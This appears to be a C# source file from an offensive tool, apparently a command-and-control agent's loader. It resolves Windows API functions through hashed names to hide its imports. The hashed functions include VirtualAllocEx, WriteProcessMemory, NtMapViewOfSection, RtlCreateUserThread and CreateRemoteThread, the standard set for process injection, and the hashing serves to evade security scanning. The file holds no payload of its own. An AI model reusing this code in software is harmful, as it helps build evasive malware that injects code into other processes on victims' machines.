using System;
using System.Collections.Generic;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Invoker.Dynamic
{
    public static class Resolver
    {
        private static long key = 0x617468656E61;
        public static Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" }, //kernel32
            { "ntd", "532FBE7D503E25FEDC8544721B744E16" }, //ntdll
            { "va", "099F8A295CEEBF8CA978C7F2D3C29C65" }, //VirtualAlloc
            { "vae", "B0EEE07D4F1EA12B868089343F9264C6" }, //VirtualAllocEx
            { "vf", "D722A173EFC826FCE170ED01CC916CB3" }, //VirtualFree
            { "vp", "784C68EEDB2E6D5931063D5348864AAD" }, //VirtualProtect
            { "gph", "32452BC4AE881B3A1279C19A45099F5E" }, //GetProcessHeap
            { "ha", "CE6048200D37496CFE1BDBD19A4A9D2E" }, //HeapAlloc
            { "zm", "226EED5D120F609602B78F22C80030F5" }, //ZeroMemory
            { "hf", "E93A16787682A99D492C316DF0C6C375" }, //HeapFree
            { "ll", "279B58F6D204CE72F758F09F4DFDCDA6" }, //LoadLibrary
            { "gpa", "96D9BE88669FB6C925C85443F50CC504" }, //GetProcAddress
            { "ct", "20CA65BB9E60472587684C28113B8DA8" }, //CreateThread
            { "wpm", "A7592F86BEF17E2705EE75EFA81EF52B" }, //WriteProcessMemory
            { "ncs", "F02C007B9EA8335BDD3ED4A0CCA00C19" }, //NtCreateSection
            { "nmvos", "40D0EA186AB9C28518E31DBF4149F653" }, //NtMapViewOfSection
            { "rcut", "ACCEA385032CC00E5FA4B2A5EC57C8F3" }, //RtlCreateUserThread
            { "wfso", "594EB168A04D43B9EFB78E57998517C6" }, //WaitForSingleObject
            { "gect", "BBE43BEDC9085A8458895E7884F7FCF9"}, //GetExitCodeThread
            { "crt", "D2CF12547B8E0297710F0C1B7A6B8174" }, //CreateRemoteThread
        };
        private static Dictionary<string, IntPtr> entries = new Dictionary<string, IntPtr>();
        public static bool ResolveFuncs(List<string> funcs, string module)
        {
            bool success = true;
            if (!entries.ContainsKey(module))
            {
                if (!map.ContainsKey(module)){
                    return false;
                }
                var mod = Generic.GetLoadedModulePtr(map[module], key);

                if(mod == IntPtr.Zero)
                {
                    success = false;
                    return success;
                }
                entries.Add(module, mod);
            }


            foreach(var func in funcs)
            {
                if (entries.ContainsKey(func))
                {
                    continue;
                }

                if (!map.ContainsKey(func))
                {
                    success = false;
                    return success;
                }
                IntPtr funcPtr = Generic.GetExportAddr(entries[module], map[func], key);

                if(funcPtr == IntPtr.Zero)
                {
                    success = false;
                    return success;
                }
                entries.Add(func, funcPtr);
            }

            return success;
        }

        public static IntPtr GetFunc(string name)
        {
            if (entries.ContainsKey(name))
            {
                return entries[name];
            }
            return IntPtr.Zero;
        }
    }
}
